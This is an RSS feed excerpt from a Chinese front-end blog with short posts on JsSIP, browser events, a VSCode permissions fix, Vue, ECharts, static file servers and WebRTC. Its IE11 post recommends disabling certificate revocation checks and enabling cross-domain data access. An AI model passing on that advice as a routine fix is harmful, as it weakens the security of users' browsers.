&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211144616_7c5Pf0_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;功能特点如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可以在浏览器或者Nodejs中运行&lt;/li&gt;
&lt;li&gt;使用WebSocket传递SIP协议&lt;/li&gt;
&lt;li&gt;视频音频实时消息使用WebRTC&lt;/li&gt;
&lt;li&gt;非常轻量&lt;/li&gt;
&lt;li&gt;100%纯JavaScript&lt;/li&gt;
&lt;li&gt;使用简单并且具有强大的Api&lt;/li&gt;
&lt;li&gt;服务端支持 OverSIP, Kamailio, Asterisk, OfficeSIP，reSIProcate，Frafos ABC SBC，TekSIP&lt;/li&gt;
&lt;li&gt;是RFC 7118 and OverSIP的作者写的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;下面是使用JsSIP打电话的例子，非常简单吧&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// Create our JsSIP instance and run it:

var socket = new JsSIP.WebSocketInterface(&amp;#39;wss://sip.myhost.com&amp;#39;);
var configuration = {
  sockets  : [ socket ],
  uri      : &amp;#39;sip:alice@example.com&amp;#39;,
  password : &amp;#39;superpassword&amp;#39;
};

var ua = new JsSIP.UA(configuration);

ua.start();

// Register callbacks to desired call events
var eventHandlers = {
  &amp;#39;progress&amp;#39;: function(e) {
    console.log(&amp;#39;call is in progress&amp;#39;);
  },
  &amp;#39;failed&amp;#39;: function(e) {
    console.log(&amp;#39;call failed with cause: &amp;#39;+ e.data.cause);
  },
  &amp;#39;ended&amp;#39;: function(e) {
    console.log(&amp;#39;call ended with cause: &amp;#39;+ e.data.cause);
  },
  &amp;#39;confirmed&amp;#39;: function(e) {
    console.log(&amp;#39;call confirmed&amp;#39;);
  }
};

var options = {
  &amp;#39;eventHandlers&amp;#39;    : eventHandlers,
  &amp;#39;mediaConstraints&amp;#39; : { &amp;#39;audio&amp;#39;: true, &amp;#39;video&amp;#39;: true }
};

var session = ua.call(&amp;#39;sip:bob@example.com&amp;#39;, options);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;22-sipjshttpssipjscom&#34;&gt;2.2 &lt;a href=&#34;https://sipjs.com/&#34;&gt;SIP.js&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;sip.js项目实际是fork自jsSIP的，这里主要介绍它的服务端支持情况。其他接口自己自行查阅&lt;/p&gt;</description>
    </item>
    <item>
      <title>不常用却很有妙用的事件及方法</title>
      <link>https://wdd.js.org/posts/2018/02/useful-browser-events/</link>
      <pubDate>Sun, 11 Feb 2018 14:34:17 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/useful-browser-events/</guid>
      <description>&lt;h1 id=&#34;1-visibilitychange事件httpsdevelopermozillaorgzh-cndocswebeventsvisibilitychange&#34;&gt;1 &lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/Events/visibilitychange&#34;&gt;visibilitychange事件&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;触发条件：&lt;code&gt;浏览器标签页被隐藏或显示的时候会触发visibilitychange事件.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用场景：&lt;code&gt;当标签页显示或者隐藏时，触发一些业务逻辑&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;document.addEventListener(&amp;#34;visibilitychange&amp;#34;, function() {
  console.log( document.visibilityState );
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-storage事件httpsdevelopermozillaorgen-usdocswebeventsstorage&#34;&gt;2 &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/Events/storage&#34;&gt;storage事件&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;触发条件：&lt;code&gt;使用localStorage or sessionStorage存储或者修改某个本地存储时&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用场景：&lt;code&gt;标签页间通信&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// AB页面同源
// 在A 页面
window.addEventListener(&amp;#39;storage&amp;#39;, (e) =&amp;gt; {console.log(e)})

// 在B 页面，向120打个电话
localStorage.setItem(&amp;#39;makeCall&amp;#39;,&amp;#39;120&amp;#39;)

// 然后可以在A页面间有输出, 可以看出A页面 收到了B页面的通知
...key: &amp;#34;makeCall&amp;#34;, oldValue: &amp;#34;119&amp;#34;, newValue: &amp;#34;120&amp;#34;, ...
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-beforeunload事件httpsdevelopermozillaorgen-usdocswebeventsbeforeunload&#34;&gt;&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/Events/beforeunload&#34;&gt;3 beforeunload事件&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;触发条件：&lt;code&gt;当页面的资源将要卸载(及刷新或者关闭标签页前). 当页面依然可见，并且该事件可以被取消只时&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用场景：&lt;code&gt;关闭或者刷新页面时弹窗确认&lt;/code&gt;，&lt;code&gt;关闭页面时向后端发送报告等&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;window.addEventListener(&amp;#34;beforeunload&amp;#34;, function (e) {
  var confirmationMessage = &amp;#34;\o/&amp;#34;;

  e.returnValue = confirmationMessage;     // Gecko, Trident, Chrome 34+
  return confirmationMessage;              // Gecko, WebKit, Chrome &amp;lt;34
});
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;4-navigatorsendbeaconhttpsdevelopermozillaorgzh-cndocswebapinavigatorsendbeacon&#34;&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator/sendBeacon&#34;&gt;4 navigator.sendBeacon&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;这个方法主要用于满足 统计和诊断代码 的需要，这些代码通常尝试在卸载（unload）文档之前向web服务器发送数据。过早的发送数据可能导致错过收集数据的机会。然而， 对于开发者来说保证在文档卸载期间发送数据一直是一个困难。因为用户代理通常会忽略在卸载事件处理器中产生的异步 XMLHttpRequest 。&lt;/p&gt;</description>
    </item>
    <item>
      <title>mac vscode 更新失败 Permission denied解决办法</title>
      <link>https://wdd.js.org/posts/2018/02/mac-vscode-update-permission-denied/</link>
      <pubDate>Sun, 11 Feb 2018 14:20:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/mac-vscode-update-permission-denied/</guid>
      <description>&lt;h1 id=&#34;0-现象&#34;&gt;0. 现象&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;Could not create temporary directory: Permission denied&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-问题起因&#34;&gt;1. 问题起因&lt;/h1&gt;
&lt;p&gt;在 &lt;code&gt;/Users/username/Library/Caches/&lt;/code&gt;目录下，有以下两个文件， 可以看到，他们两个的用户是不一样的，一个是&lt;code&gt;root&lt;/code&gt;一个&lt;code&gt;username&lt;/code&gt;, 一般来说，我是以&lt;code&gt;username&lt;/code&gt;来使用我的mac的。就是因为这两个文件的用户不一样，导致了更新失败。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;drwxr-xr-x   6 username  staff   204B Jan 17 20:33 com.microsoft.VSCode
drwxr--r--   2 root    staff    68B Dec 17 13:51 com.microsoft.VSCode.ShipIt
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-解决方法&#34;&gt;2. 解决方法&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;注意&lt;/code&gt;： 先把vscode 完全关闭&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 1. 这一步是需要输入密码的
sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/

// 2. 这一步是不需要输入密码的, 如果不进行第一步，第二步会报错
sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/*

// 3. 更新xattr
xattr -dr com.apple.quarantine /Applications/Visual\ Studio\ Code.app
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-打开vscode&#34;&gt;3. 打开vscode&lt;/h1&gt;
&lt;p&gt;Code &amp;gt; Check for Updates, 点击之后，你会发现&lt;code&gt;Check for Updates&lt;/code&gt;已经变成灰色了，那么你需要稍等片刻，马上就可以更新，之后会跳出提示，让你重启vscode, 然后重启一下vscode, 就ok了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>IE11 0x2ee4 bug 以及类似问题解决方法</title>
      <link>https://wdd.js.org/posts/2018/02/ie11-0x2ee4-bug/</link>
      <pubDate>Sun, 11 Feb 2018 14:12:19 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/ie11-0x2ee4-bug/</guid>
      <description>&lt;p&gt;&lt;code&gt;一千个IE浏览器访问同一个页面，可能报一千种错误&lt;/code&gt;。前端激进派对IE恨得牙痒痒，但是无论你爱，或者不爱，IE就在那里，不来不去。&lt;/p&gt;
&lt;p&gt;一些银行，以及政府部门，往往都是指定必须使用IE浏览器。所以，一些仅在IE浏览器上出现的问题。总结起来问题的原因很简单：&lt;code&gt;IE的配置不正确&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;下面就将一个我曾经遇到的问题: &lt;code&gt;IE11 0x2ee4&lt;/code&gt;， 以及其他的问题的解决方案&lt;/p&gt;
&lt;h1 id=&#34;1-ie11-script7002-xmlhttprequest-网络错误-0x2ee4&#34;&gt;1. IE11 SCRIPT7002: XMLHttpRequest: 网络错误 0x2ee4&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;背景介绍：在一个HTTPS域向另外一个HTTPS域发送跨域POTST请求时&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这个问题在浏览器的输出内容如下，怪异的是，并不是所有IE11都会报这个错误。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SCRIPT7002: XMLHttpRequest: 网络错误 0x2ee4, 由于出现错误 00002ee4 而导致此项操作无法完成
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;stackoverflow上有个答案，它的思路是：&lt;code&gt;在post请求发送之前，先进行一次get操作&lt;/code&gt; 这个方式我试过，是可行的。但是深层次的原因我不是很明白。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141321_kcU1Mh_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;然而真相总有大白的一天，其实深层次的原因是，IE11的配置。&lt;/p&gt;
&lt;p&gt;去掉检查证书吊销的的检查，解决0x2ee4的问题&lt;/p&gt;
&lt;p&gt;&lt;code&gt;解决方法&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;去掉check for server certificate revocation*， 也有可能你那边是中文翻译的：叫检查服务器证书是否已吊销&lt;/li&gt;
&lt;li&gt;去掉检查发型商证书是否已吊销&lt;/li&gt;
&lt;li&gt;点击确定&lt;/li&gt;
&lt;li&gt;重启计算机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141332_EzU6Hs_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-其他常规设置&#34;&gt;2 其他常规设置&lt;/h1&gt;
&lt;h2 id=&#34;21-去掉兼容模式-使用edge文档模式&#34;&gt;2.1 去掉兼容模式， 使用Edge文档模式&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141344_ctLchE_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;下图中红色框里的按钮也要取消勾选
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141353_182pMj_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;22-有些使用activex还是需要检查是否启用的&#34;&gt;2.2 有些使用activeX，还是需要检查是否启用的&lt;/h2&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141403_eM2ajd_Screenshot.jpeg&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141414_8gyYUu_Screenshot.jpeg&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141427_CeMrwH_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;23-允许跨域&#34;&gt;2.3 允许跨域&lt;/h2&gt;
&lt;p&gt;如果你的接口跨域了，还要检查浏览器是否允许跨域，否则浏览器可能默认就禁止跨域的&lt;/p&gt;
&lt;p&gt;设置方法&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;internet选项&lt;/li&gt;
&lt;li&gt;安全&lt;/li&gt;
&lt;li&gt;自定义级别&lt;/li&gt;
&lt;li&gt;&lt;code&gt;启用通过跨域访问数据源&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;启用跨域浏览窗口和框架&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;确定&lt;/li&gt;
&lt;li&gt;然后&lt;code&gt;重启电脑&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180211141443_fV3amH_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180322150920_oVhst9_Jietu20180322-150855.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Vue&#43;ElementUI 手把手教你做一个audio组件</title>
      <link>https://wdd.js.org/posts/2018/02/vue-elementui-audio-component/</link>
      <pubDate>Fri, 09 Feb 2018 13:44:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/vue-elementui-audio-component/</guid>
      <description>&lt;h1 id=&#34;1-简介&#34;&gt;1. 简介&lt;/h1&gt;
&lt;h2 id=&#34;11-相关技术&#34;&gt;1.1. 相关技术&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://cn.vuejs.org/&#34;&gt;Vue&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/vuejs/vue-cli&#34;&gt;Vue-cli&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://element-cn.eleme.io/#/zh-CN&#34;&gt;ElementUI&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://yarnpkg.com/lang/zh-hans/&#34;&gt;yarn&lt;/a&gt; (之前我用npm, 并使用cnpm的源，但是用了yarn之后，我发现它比cnpm的速度还快，功能更好，我就毫不犹豫选择yarn了)&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://segmentfault.com/a/1190000009769804&#34;&gt;Audio相关API和事件&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;12-从本教程你会学到什么&#34;&gt;1.2. 从本教程你会学到什么？&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Vue单文件组件开发知识&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Element UI基本用法&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Audio原生API及Audio相关事件&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;音频播放器的基本原理&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;音频的播放暂停控制&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;更新音频显示时间&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;音频进度条控制与跳转&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;音频音量控制&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;音频播放速度控制&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;音频静音控制&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;音频下载控制&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;个性化配置与排他性播放&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;一点点ES6语法&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-学前准备&#34;&gt;2. 学前准备&lt;/h1&gt;
&lt;p&gt;基本上不需要什么准备，但是如果你能先看一下Aduio相关API和事件将会更好&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://wdd.js.org/audio-heart-detail.html&#34;&gt;Audio: 如果你愿意一层一层剥开我的心&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/Guide/HTML/Using_HTML5_audio_and_video&#34;&gt;使用 HTML5 音频和视频&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-在线demonhttpswangduanduangithubioelement-audio&#34;&gt;3. &lt;a href=&#34;https://wangduanduan.github.io/element-audio/&#34;&gt;在线demon&lt;/a&gt;&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;没有在线demo的教程都是耍流氓&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://wangduanduan.github.io/element-audio/&#34;&gt;查看在线demon&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/wangduanduan/element-audio&#34;&gt;项目地址&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180209134536_j9HvMg_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-开始编码&#34;&gt;4. 开始编码&lt;/h1&gt;
&lt;h1 id=&#34;5-项目初始化&#34;&gt;5. 项目初始化&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;➜  test vue init webpack element-audio

  A newer version of vue-cli is available.

  latest:    2.9.2
  installed: 2.9.1

? Project name element-audio
? Project description A Vue.js project
? Author wangdd &amp;lt;wangdd@xxxxxx.com&amp;gt;
? Vue build standalone
? Install vue-router? No
? Use ESLint to lint your code? No
? Set up unit tests No
? Setup e2e tests with Nightwatch? No
? Should we run `npm install` for you after the project has been created? (recommended) npm

➜  test cd element-audio 
➜  element-audio npm run dev
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;浏览器打开 &lt;code&gt;http://localhost:8080/&lt;/code&gt;, 看到如下界面，说明项目初始化成功&lt;/p&gt;</description>
    </item>
    <item>
      <title>你不知道的JSON.stringify()妙用</title>
      <link>https://wdd.js.org/posts/2018/02/json-stringify-powerful/</link>
      <pubDate>Fri, 09 Feb 2018 13:27:15 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/json-stringify-powerful/</guid>
      <description>&lt;h1 id=&#34;1-语法&#34;&gt;1. 语法&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;JSON.stringify(value[, replacer[, space]])
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;一般用法：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var user = {name: &amp;#39;andy&amp;#39;, isDead: false, age: 11, addr: &amp;#39;shanghai&amp;#39;};

JSON.stringify(user);

&amp;#34;{&amp;#34;name&amp;#34;:&amp;#34;andy&amp;#34;,&amp;#34;isDead&amp;#34;:false,&amp;#34;age&amp;#34;:11,&amp;#34;addr&amp;#34;:&amp;#34;shanghai&amp;#34;}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-扩展用法&#34;&gt;2. 扩展用法&lt;/h1&gt;
&lt;h2 id=&#34;21-replacer&#34;&gt;2.1. replacer&lt;/h2&gt;
&lt;p&gt;replacer可以是&lt;code&gt;函数&lt;/code&gt;或者是&lt;code&gt;数组&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;功能1: 改变属性值&lt;/code&gt;
将isDead属性的值翻译成0或1，0对应false,1对应true&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var user = {name: &amp;#39;andy&amp;#39;, isDead: false, age: 11, addr: &amp;#39;shanghai&amp;#39;};

JSON.stringify(user, function(key, value){
    if(key === &amp;#39;isDead&amp;#39;){
        return value === true ? 1 : 0;
    }
    return value;
});

&amp;#34;{&amp;#34;name&amp;#34;:&amp;#34;andy&amp;#34;,&amp;#34;isDead&amp;#34;:0,&amp;#34;age&amp;#34;:11,&amp;#34;addr&amp;#34;:&amp;#34;shanghai&amp;#34;}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;功能2：删除某个属性&lt;/code&gt;
将isDead属性删除，如果replacer的返回值是&lt;code&gt;undefined&lt;/code&gt;,那么该属性会被删除。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var user = {name: &amp;#39;andy&amp;#39;, isDead: false, age: 11, addr: &amp;#39;shanghai&amp;#39;};

JSON.stringify(user, function(key, value){
    if(key === &amp;#39;isDead&amp;#39;){
        return undefined;
    }
    return value;
});

&amp;#34;{&amp;#34;name&amp;#34;:&amp;#34;andy&amp;#34;,&amp;#34;age&amp;#34;:11,&amp;#34;addr&amp;#34;:&amp;#34;shanghai&amp;#34;}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;功能3: 通过数组过滤某些属性&lt;/code&gt;
只需要name属性和addr属性，其他不要。&lt;/p&gt;</description>
    </item>
    <item>
      <title>ECharts 轮流高亮中国地图各个省份</title>
      <link>https://wdd.js.org/posts/2018/02/echarts-highlight-china-map/</link>
      <pubDate>Fri, 09 Feb 2018 13:16:53 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/echarts-highlight-china-map/</guid>
      <description>&lt;h1 id=&#34;1-小栗子&#34;&gt;1. 小栗子&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180209131759_k10o0Z_bVVWEB.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;最早我是想通过&lt;code&gt;dispatchAction&lt;/code&gt;方法去改变选中的省份，但是没有起作用，如果你知道这个方法怎么实现，麻烦你可以告诉我。
我实现的方法是另外一种。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;dispatchAction({
    type: &amp;#39;geoSelect&amp;#39;,
    // 可选，系列 index，可以是一个数组指定多个系列
    seriesIndex?: number|Array,
    // 可选，系列名称，可以是一个数组指定多个系列
    seriesName?: string|Array,
    // 数据的 index，如果不指定也可以通过 name 属性根据名称指定数据
    dataIndex?: number,
    // 可选，数据名称，在有 dataIndex 的时候忽略
    name?: string
})
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;后来我改变了一个方法。这个方法的核心思路是定时获取图标的配置，然后更新配置，最后在设置配置。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var myChart = echarts.init(document.getElementById(&amp;#39;china-map&amp;#39;));

var COLORS = [&amp;#34;#070093&amp;#34;, &amp;#34;#1c3fbf&amp;#34;, &amp;#34;#1482e5&amp;#34;, &amp;#34;#70b4eb&amp;#34;, &amp;#34;#b4e0f3&amp;#34;, &amp;#34;#ffffff&amp;#34;];

// 指定图表的配置项和数据
var option = {
    tooltip: {
        trigger: &amp;#39;item&amp;#39;,
        formatter: &amp;#39;{b}&amp;#39;
    },
    series: [
        {
            name: &amp;#39;中国&amp;#39;,
            type: &amp;#39;map&amp;#39;,
            mapType: &amp;#39;china&amp;#39;,
            selectedMode : &amp;#39;single&amp;#39;,
            label: {
                normal: {
                    show: true
                },
                emphasis: {
                    show: true
                }
            },
            data:[
                // 默认高亮安徽省
                {name:&amp;#39;安徽&amp;#39;, selected:true}
            ],
            itemStyle: {
                normal: {
                    areaColor: &amp;#39;rgba(255,255,255,0.5)&amp;#39;,
                    color: &amp;#39;#000000&amp;#39;,
                    shadowBlur: 200,
                    shadowColor: &amp;#39;rgba(0, 0, 0, 0.5)&amp;#39;
                },
                emphasis:{
                    areaColor: &amp;#39;#3be2fb&amp;#39;,
                    color: &amp;#39;#000000&amp;#39;,
                    shadowBlur: 200,
                    shadowColor: &amp;#39;rgba(0, 0, 0, 0.5)&amp;#39;
                }
            }
        }
    ]
};

// 使用刚指定的配置项和数据显示图表。
myChart.setOption(option);

myChart.on(&amp;#39;click&amp;#39;, function(params) {
    console.log(params);
});

setInterval(function(){
    var op = myChart.getOption();
    var data = op.series[0].data;

    var length = data.length;

    data.some(function(item, index){
        if(item.selected){
            item.selected = false;
            var next = (index + 1)%length;
            data[next].selected = true;
            return true;
        }
    });

    myChart.setOption(op);

}, 3000);
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-后续补充&#34;&gt;2. 后续补充&lt;/h1&gt;
&lt;p&gt;我从这里发现：https://github.com/ecomfe/echarts/issues/3282，选中地图的写法是这样的，而试了一下果然可以。主要是type要是&lt;code&gt;mapSelect&lt;/code&gt;,而不是&lt;code&gt;geoSelect&lt;/code&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>一行命令搭建简易静态文件http服务器</title>
      <link>https://wdd.js.org/posts/2018/02/one-command-create-static-file-server/</link>
      <pubDate>Fri, 09 Feb 2018 13:01:14 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/one-command-create-static-file-server/</guid>
      <description>&lt;p&gt;简易服务器：在命令执行的所在路径启动一个http服务器，然后你可以通过浏览器访问该路径下的所有文件。&lt;/p&gt;
&lt;p&gt;在局域网内传文件，或者自己测试使用都是非常方便的。&lt;/p&gt;
&lt;h1 id=&#34;1-基于python&#34;&gt;1. 基于python&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180209130207_yzmvQO_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;11-基于python2&#34;&gt;1.1. 基于Python2&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;python -m SimpleHTTPServer port&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; python -m SimpleHTTPServer 8099
Serving HTTP on 0.0.0.0 port 8099 ...
127.0.0.1 - - [24/Oct/2017 11:07:56] &amp;#34;GET / HTTP/1.1&amp;#34; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;12-基于python3&#34;&gt;1.2. 基于python3&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;python3 -m http.server port&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; python3 -m http.server 8099
Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ...
127.0.0.1 - - [24/Oct/2017 11:05:06] &amp;#34;GET / HTTP/1.1&amp;#34; 200 -
127.0.0.1 - - [24/Oct/2017 11:05:06] code 404, message File not found
127.0.0.1 - - [24/Oct/2017 11:05:06] &amp;#34;GET /favicon.ico HTTP/1.1&amp;#34; 404 -
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;2-基于nodejs&#34;&gt;2. 基于nodejs&lt;/h1&gt;
&lt;p&gt;首先你要安装nodejs
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180209130231_76jUWj_Screenshot.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>120行代码实现 浏览器WebRTC视频聊天</title>
      <link>https://wdd.js.org/posts/2018/02/webrtc-tutorial-simple-video-chat/</link>
      <pubDate>Fri, 09 Feb 2018 12:56:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/webrtc-tutorial-simple-video-chat/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;本例子是参考&lt;a href=&#34;https://www.scaledrone.com/blog/posts/webrtc-tutorial-simple-video-chat&#34;&gt;webrtc-tutorial-simple-video-chat&lt;/a&gt;做的。
这个教程应该主要是去宣传ScaleDrone的sdk, 他们的服务是收费的，但是免费的也可以用，就是有些次数限制。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/wangduanduan/webrtc&#34;&gt;本栗子的地址&lt;/a&gt;
&lt;a href=&#34;https://wangduanduan.github.io/webrtc/&#34;&gt;本栗子的pages地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;因为使用的是ScaleDrone的js sdk, 后期很可能服务不稳定之类的&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-准备&#34;&gt;1. 准备&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;使用最新版谷歌浏览器（62版）&lt;/li&gt;
&lt;li&gt;视频聊天中 一个是windows, 一个是mac&lt;/li&gt;
&lt;li&gt;stun服务器使用谷歌的，trun使用&lt;a href=&#34;https://www.scaledrone.com/&#34;&gt;ScaleDrone&lt;/a&gt;的sdk，这样我就不用管服务端了。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-先上效果图&#34;&gt;2. 先上效果图&lt;/h1&gt;
